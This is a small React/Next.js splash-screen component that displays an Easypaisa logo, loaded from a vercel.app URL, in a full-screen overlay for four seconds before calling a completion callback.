'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';

const SplashScreen = ({ onFinish }) => {
  const [isVisible, setIsVisible] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsVisible(false);
      if (onFinish) onFinish();
    }, 4000);

    return () => clearTimeout(timer);
  }, [onFinish]);

  if (!isVisible) return null;

  return (
    <div className="fixed inset-0 bg-white flex items-center justify-center z-50">
      <div className="relative w-48 h-24">
        <Image
          src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
          alt="Easypaisa Logo"
          fill
          className="object-contain"
          priority
        />
      </div>
    </div>
  );
};

export default SplashScreen;